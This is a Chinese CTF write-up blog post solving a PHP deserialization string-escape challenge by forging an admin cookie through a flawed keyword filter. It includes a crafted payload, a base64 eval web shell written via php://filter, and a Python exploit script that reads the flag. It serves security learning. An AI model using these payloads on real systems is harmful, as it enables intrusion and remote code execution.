<p>可以知道<br>首先是获得session然后解密，将解密内容进行反序列话，然后调用反序列化实例的isadmin方法。首先我们不知道密钥值是多少所以无法直接通过伪造sseion来伪造admin。</p>
<p>查看login.php</p>
<pre><code class="language-python">&lt;?php
ini_set(&#39;display_errors&#39;, 0);
error_reporting(0);
include &quot;waf.php&quot;;
include &quot;class.php&quot;;
include &quot;db.php&quot;;
$username=$_POST[&quot;username&quot;];
$password=$_POST[&quot;password&quot;];

$SQL=new Database();
function login($db,$username,$password)
&#123;
    $data=$db-&gt;query(&quot;SELECT * FROM users WHERE username = ?&quot;,[$username]);

    if(empty($data))&#123;
        die(&quot;&lt;script&gt;alert(&#39;用户不存在&#39;)&lt;/script&gt;&lt;script&gt;window.location.href = &#39;index.html&#39;&lt;/script&gt;&quot;);
    &#125;
    if($data[0][&#39;password&#39;]!==md5($password))&#123;
        die(&quot;&lt;script&gt;alert(&#39;密码错误&#39;)&lt;/script&gt;&lt;script&gt;window.location.href = &#39;index.html&#39;&lt;/script&gt;&quot;);
    &#125;
    if($data[0][&#39;username&#39;]===&#39;admin&#39;) &#123;
        $user = new User($username, true);
    &#125;
    else&#123;
        $user = new User($username, false);
    &#125;
    return $user;
&#125;

function setSignedCookie($serializedData, $cookieName = &#39;user_token&#39;, $secretKey = &#39;fake_secretKey&#39;) &#123;
    $signature = hash_hmac(&#39;sha256&#39;, $serializedData, $secretKey);

    $token = base64_encode($serializedData . &#39;|&#39; . $signature);

    setcookie($cookieName, $token, time() + 3600, &quot;/&quot;);  // 设置有效期为1小时
&#125;

$User=login($SQL,$username,$password);

$User_ser=waf(serialize($User));

setSignedCookie($User_ser);

header(&quot;Location: dashboard.php&quot;);

?&gt;
</code></pre>
<p>可以发现在login方法中最后返回的是一个user类，</p>
<pre><code class="language-python">return $user;
</code></pre>
<p>随后再将这个类进行序列化并传入waf方法检测</p>
<p>然后使用setSignedCookie()方法进行加密</p>
<pre><code class="language-python">function setSignedCookie($serializedData, $cookieName = &#39;user_token&#39;, $secretKey = &#39;fake_secretKey&#39;) &#123;
    $signature = hash_hmac(&#39;sha256&#39;, $serializedData, $secretKey);

    $token = base64_encode($serializedData . &#39;|&#39; . $signature);

    setcookie($cookieName, $token, time() + 3600, &quot;/&quot;);  // 设置有效期为1小时
&#125;
</code></pre>
<p>再去看看waf.php</p>
<pre><code class="language-python">&lt;?php

function waf($c)
&#123;
    $lists=[&quot;flag&quot;,&quot;&#39;&quot;,&quot;\\&quot;,&quot;sleep&quot;,&quot;and&quot;,&quot;||&quot;,&quot;&amp;&amp;&quot;,&quot;select&quot;,&quot;union&quot;];
    foreach($lists as $list)&#123;
        $c=str_replace($list,&quot;error&quot;,$c);
    &#125;
    #echo $c;
    return $c;
&#125;
</code></pre>
<h3 id="字符串逃逸"><a href="#字符串逃逸" class="headerlink" title="字符串逃逸"></a><font style="color:rgb(38,38,38);">字符串逃逸</font></h3><ul>
<li>遍历黑名单，将每个危险词替换为”error”</li>
<li>示例：输入<code>&#39; UNION SELECT flag</code> → 输出<code>error UNION SELECT error</code></li>
</ul>
<p>这里我猜测存在非预期解</p>
<p>因为waf的过滤并不完整<code>str_replace</code>区分大小写，那是不是可以直接进行sql注入</p>
<p>非预期解的思路就提供到这里，有兴趣的可以去试试</p>
<h4 id="字符逃逸的原理"><a href="#字符逃逸的原理" class="headerlink" title="字符逃逸的原理"></a>字符逃逸的原理</h4><p><font style="color:rgb(76, 73, 72);">首先我们要知道反序列的结束位置。当反序列化遇到</font><code>&lt;font style=&quot;color:rgb(244, 116, 102);&quot;&gt;;&#125;&lt;/font&gt;</code><font style="color:rgb(76, 73, 72);">时就会停止。注意</font><code>&lt;font style=&quot;color:rgb(244, 116, 102);&quot;&gt;;&#125;&lt;/font&gt;</code><font style="color:rgb(76, 73, 72);">是不能包含再字符串里的即像</font><code>&lt;font style=&quot;color:rgb(244, 116, 102);&quot;&gt;s:5:&quot;lll;&#125;&quot;;&#125;&lt;/font&gt;</code><font style="color:rgb(76, 73, 72);">前一个</font><code>&lt;font style=&quot;color:rgb(244, 116, 102);&quot;&gt;;&#125;&lt;/font&gt;</code><font style="color:rgb(76, 73, 72);">是字符串的第4,5个字符，这就导致了其无法将反序列提前结束。<br></font><font style="color:rgb(76, 73, 72);">但是如果由于waf导致字符变多或者减少这就会导致，原本应该被解析为字符的字符被解析为特殊字符，使得反序列的结果被更改。</font></p>
<h4 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h4><p><font style="color:rgb(76, 73, 72);">还是拿上面的函数来作为waf来解释</font></p>
<pre><code class="language-php">&lt;?php
  function black_list($str)
&#123;
  $str=preg_replace(&#39;/flag/i&#39;,&#39;hacker~&#39;,$str);
return $str;
&#125;
class E&#123;
  public $a=&#39;flag&quot;;&#125;&#39;;
  public $b=&quot;lalalalala&quot;;
&#125;
$a=serialize(new E());
$a=black_list($a)
</code></pre>
<p><font style="color:rgb(76, 73, 72);">上面的代码就存在字符逃逸字符增多的漏洞<br></font><font style="color:rgb(76, 73, 72);">我们要利用修改</font><code>&lt;font style=&quot;color:rgb(244, 116, 102);&quot;&gt;$a&lt;/font&gt;</code><font style="color:rgb(76, 73, 72);">的值来尝试修改$b的值。</font></p>
<pre><code class="language-php">O:1:&quot;E&quot;:2:&#123;s:1:&quot;a&quot;;s:7:&quot;hacker~&quot;;&#125;;s:1:&quot;b&quot;;s:10:&quot;lalalalala&quot;;&#125;
</code></pre>
<p><font style="color:rgb(76, 73, 72);">我们可以看到上面的的flag变成了</font><code>&lt;font style=&quot;color:rgb(244, 116, 102);&quot;&gt;hacker~&lt;/font&gt;</code><font style="color:rgb(76, 73, 72);">正好和</font><code>&lt;font style=&quot;color:rgb(244, 116, 102);&quot;&gt;flag&quot;;&#125;&lt;/font&gt;</code><font style="color:rgb(76, 73, 72);">的长度相同那么这就导致了hacker~被识别为了字符串而</font><code>&lt;font style=&quot;color:rgb(244, 116, 102);&quot;&gt;&quot;;&#125;&lt;/font&gt;</code><font style="color:rgb(76, 73, 72);">被识别为了特殊字符。这就导致了反序列是遇到了</font><code>&lt;font style=&quot;color:rgb(244, 116, 102);&quot;&gt;;&#125;&lt;/font&gt;</code><font style="color:rgb(76, 73, 72);">提前结束。这就是waf错误的将反序列的的字符增多导致了</font><code>&lt;font style=&quot;color:rgb(244, 116, 102);&quot;&gt;&quot;;&#125;&lt;/font&gt;</code><font style="color:rgb(76, 73, 72);">逃逸出字符串被解析为反序列语句。</font><br><font style="color:rgb(76, 73, 72);">那么我们可以将</font><code>&lt;font style=&quot;color:rgb(244, 116, 102);&quot;&gt;&quot;;&#125;&lt;/font&gt;</code><font style="color:rgb(76, 73, 72);">进行更改更改成</font><code>&lt;font style=&quot;color:rgb(244, 116, 102);&quot;&gt;&quot;;s:1:&quot;b&quot;;s:10:&quot;hahahahaha&quot;;&#125;&lt;/font&gt;</code><font style="color:rgb(76, 73, 72);">如果这句话被逃逸就会造成反序列的结果被更改即类的属性被更改。</font><br><font style="color:rgb(76, 73, 72);">如果要使</font><code>&lt;font style=&quot;color:rgb(244, 116, 102);&quot;&gt;&quot;;s:1:&quot;b&quot;;s:13:&quot;hhhhahahahaha&quot;;&#125;&lt;/font&gt;</code><font style="color:rgb(76, 73, 72);">逃逸就要使pop链再被waf更改后的字符增多相同字符数。如</font></p>
<pre><code class="language-php">O:1:&quot;E&quot;:2:&#123;s:1:&quot;a&quot;;s:64:&quot;flagflagflagflagflagflagflagflag&quot;;s:1:&quot;b&quot;;s:13:&quot;hhhhahahahaha&quot;;&#125;&quot;;s:1:&quot;b&quot;;s:10:&quot;lalalalala&quot;;&#125;
</code></pre>
<p><font style="color:rgb(76, 73, 72);">我们传入的</font><code>&lt;font style=&quot;color:rgb(244, 116, 102);&quot;&gt;$a&lt;/font&gt;</code><font style="color:rgb(76, 73, 72);">值为</font><code>&lt;font style=&quot;color:rgb(244, 116, 102);&quot;&gt;flagflagflagflagflagflagflagflag&quot;;s:1:&quot;b&quot;;s:13:&quot;hhhhahahahaha&quot;;&#125;&lt;/font&gt;</code><font style="color:rgb(76, 73, 72);">传入了8个flag再经过waf后变为</font></p>
<pre><code class="language-php">O:1:&quot;E&quot;:2:&#123;s:1:&quot;a&quot;;s:64:&quot;hacker~hacker~hacker~hacker~hacker~hacker~hacker~hacker~&quot;;s:1:&quot;b&quot;;s:13:&quot;hhhhahahahaha&quot;;&#125;&quot;;s:1:&quot;b&quot;;s:10:&quot;lalalalala&quot;;&#125;
</code></pre>
<p><font style="color:rgb(76, 73, 72);">替换后的字符正好为64个即多出来的字符数整好为需要逃逸的字符数。导致</font><code>&lt;font style=&quot;color:rgb(244, 116, 102);&quot;&gt;&quot;;s:1:&quot;b&quot;;s:13:&quot;hhhhahahahaha&quot;;&#125;&lt;/font&gt;</code><font style="color:rgb(76, 73, 72);">逃逸这就使得</font><code>&lt;font style=&quot;color:rgb(244, 116, 102);&quot;&gt;&quot;&lt;/font&gt;</code><font style="color:rgb(76, 73, 72);">闭合前一个引号</font><code>&lt;font style=&quot;color:rgb(244, 116, 102);&quot;&gt;;s:1:&quot;b&quot;;s:13:&quot;hhhhahahahaha&quot;;&#125;&lt;/font&gt;</code><font style="color:rgb(76, 73, 72);">被解析为反序列化链。这就使得被解析后的b变为了hhhhhahahaha而不是lalalalalala。</font></p>
<h3 id="预期解"><a href="#预期解" class="headerlink" title="预期解"></a>预期解</h3><p><font style="color:rgb(76, 73, 72);">waf函数是对关键字进行替换，这就导致了序列化的字符数量发生了改变，从而导致了字符串逃逸。</font></p>
<p><font style="color:rgb(76, 73, 72);">我们想要伪造的其实是类似于如下的序列化字符，用户名无所谓，但是isadmin要为true(判断是否为管理员，因为只有管理员才有写入权限)</font></p>
<p><font style="color:rgb(76, 73, 72);">构建以下序列化</font></p>
<pre><code class="language-php">&lt;?php
class User
&#123;
    public $username;
    public $isadmin;
    public function __construct($username,$isadmin)
    &#123;
        $this-&gt;username=$username;
        $this-&gt;isadmin=$isadmin;
    &#125;

&#125;

$user = new User(&quot;zerotrace&quot;, true);
echo serialize($user);
#输出O:4:&quot;User&quot;:2:&#123;s:8:&quot;username&quot;;s:9:&quot;zerotrace&quot;;s:7:&quot;isadmin&quot;;b:1;&#125;
</code></pre>
<p><font style="color:rgb(76, 73, 72);">那么我们输入的username就应该是xxxxxx”;s:7:”isadmin”;b:1;}。前面的xxxxx经过waf后会变多21个从而把后面的</font><code>&lt;font style=&quot;color:rgb(244, 116, 102);&quot;&gt;&quot;;s:7:&quot;isadmin&quot;;b:1;&#125;&lt;/font&gt;</code><font style="color:rgb(76, 73, 72);">逃逸出去<br></font><font style="color:rgb(76, 73, 72);">那么xxxx就可以是flagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflag。21个flag会被替换成21个error。</font></p>
<p>那么思路就很清晰了，我们注册一个字符串逃逸伪造admin的用户名如下</p>
<pre><code class="language-php">flagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflag&quot;;s:7:&quot;isadmin&quot;;b:1;&#125;
</code></pre>
<p><img src="1742541181145-48f5cb2a-8cbb-4b19-93d9-9414db0415fb.png" loading="lazy"></p>
<p>成功伪造admin</p>
<p>使用伪协议写入文件</p>
<pre><code class="language-php">filename=php://filter/convert.base64-decode/resource=/var/www/html/1.php&amp;txt=aPD9waHAgZXZhbCgkX1BPU1RbMTIzXSk/Pg==
</code></pre>
<p>蚁剑连接</p>
<p><img src="1742541250329-3feb7b36-2972-41d3-a79a-6be769e089ac.png" loading="lazy"></p>
<p><img src="1742541278009-4d0f89ba-7d63-4468-9193-3f8e4438336e.png" loading="lazy"></p>
<p>也可以使用exp直接梭哈</p>
<pre><code class="language-python">import requests
def exp(url):
    data=&#123;&quot;username&quot;:&#39;flagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflag&quot;;s:7:&quot;isadmin&quot;;b:1;&#125;&#39;,&quot;password&quot;:&quot;123456&quot;&#125;
    r=requests.post(url+&quot;register.php&quot;,data=data)
    #print(r.text)

    session = requests.Session()
    login_response = session.post(url+&quot;login.php&quot;, data=data)

    shell=&#123;&quot;filename&quot;:&quot;php://filter/convert.base64-decode/resource=/var/www/html/shell.php&quot;,&quot;txt&quot;:&quot;aPD9waHAgZXZhbCgkX1BPU1RbMTIzXSk/Pg==&quot;&#125;
    protected_response = session.post(url+&quot;dashboard.php&quot;,data=shell)
    response = requests.post(url+&quot;shell.php&quot;,data=&#123;&quot;123&quot;:&quot;system(&#39;cat /flag&#39;);&quot;&#125;)
    print(response.text)

if __name__==&quot;__main__&quot;:
    url=&quot;http://node2.anna.nssctf.cn:28932/&quot;
    exp(url)
</code></pre>
<p><img src="1742526871287-3b615f13-a594-4150-8208-72e77b2480fa.png" loading="lazy"></p>
</div></section><ul class="post-copyright"><li class="post-copyright-author"><strong>本文作者：</strong>ZeroTrace</li><li class="post-copyright-link"><strong>本文链接：</strong><a href="http://example.com/article/2025/03/2025GHCTF-wp.html/" title="2025GHCTF新生赛(悄悄塞国际题)">http://example.com/article/2025/03/2025GHCTF-wp.html/</a></li><li class="post-copyright-license"><strong>版权声明：</strong>本博客所有文章除特别声明外，均默认采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank" rel="noopener" title="CC BY-NC-SA 4.0 "><span class="icon iconify" data-icon="ri:creative-commons-line"></span><span class="icon iconify" data-icon="ri:creative-commons-by-line"></span><span class="icon iconify" data-icon="ri:creative-commons-nc-line"></span><span class="icon iconify" data-icon="ri:creative-commons-sa-line"></span></a> 许可协议。</li></ul></article><div class="post-nav"><div class="post-nav-item"><a class="post-nav-prev" href="/article/2025/03/2025.3.15-practice-wp.html/" rel="prev" title="203周末练习赛25/3/15"><span class="icon iconify" data-icon="ri:arrow-left-s-line"></span><span class="post-nav-text">203周末练习赛25/3/15</span></a></div><div class="post-nav-item"><a class="post-nav-next" href="/article/2025/03/welcome-203.html/" rel="next" title="欢迎来到203"><span class="post-nav-text">欢迎来到203</span><span class="icon iconify" data-icon="ri:arrow-right-s-line"></span></a></div></div></div><div class="hty-card" id="comment"></div></main><footer class="sidebar-translate" id="footer"><div class="copyright"><span>&copy; 2024 – 2025 </span><span class="with-love" id="animate"><span class="icon iconify" data-icon="ri:cloud-line"></span></span><span class="author"> John Doe</span></div><div class="powered"><span>由 <a href="https://hexo.io" target="_blank" rel="noopener">Hexo</a> 驱动 v7.3.0</span><span class="footer-separator">|</span><span>主题 - <a rel="noopener" href="https://github.com/YunYouJun/hexo-theme-yun" target="_blank"><span>Yun</span></a> v1.10.11</span></div><div class="live-time"><span>感谢陪伴</span><span id="display_live_time"></span><span class="moe-text">(●'◡'●)</span><script>function blog_live_time() {
  setTimeout(blog_live_time, 1000);
  const start = new Date('2025-03-20T00:00:00');
  const now = new Date();
  const timeDiff = (now.getTime() - start.getTime());
  const msPerMinute = 60 * 1000;
  const msPerHour = 60 * msPerMinute;
  const msPerDay = 24 * msPerHour;
  const passDay = Math.floor(timeDiff / msPerDay);
  const passHour = Math.floor((timeDiff % msPerDay) / 60 / 60 / 1000);
  const passMinute = Math.floor((timeDiff % msPerHour) / 60 / 1000);
  const passSecond = Math.floor((timeDiff % msPerMinute) / 1000);
  display_live_time.innerHTML = ` ${passDay} 天 ${passHour} 小时 ${passMinute} 分 ${passSecond} 秒`;
}
blog_live_time();
</script></div><div class="footer-custom-text">YourText <a href="yourLink" rel="noopener" target="_blank">Description</a></div></footer></div><a class="hty-icon-button" id="back-to-top" aria-label="back-to-top" href="#"><span class="icon iconify" data-icon="ri:arrow-up-s-line"></span><svg class="progress-circle-container" viewBox="0 0 100 100"><circle class="progress-circle" id="progressCircle" cx="50" cy="50" r="48" fill="none" stroke="#0078E7" stroke-width="2" stroke-linecap="round"></circle></svg></a><script src="https://fastly.jsdelivr.net/npm/medium-zoom@1.0.6/dist/medium-zoom.min.js"></script><script>const images = [...document.querySelectorAll('.markdown-body img')]
mediumZoom(images)</script><style>.medium-zoom-image {
  z-index: 99;
}</style></body></html>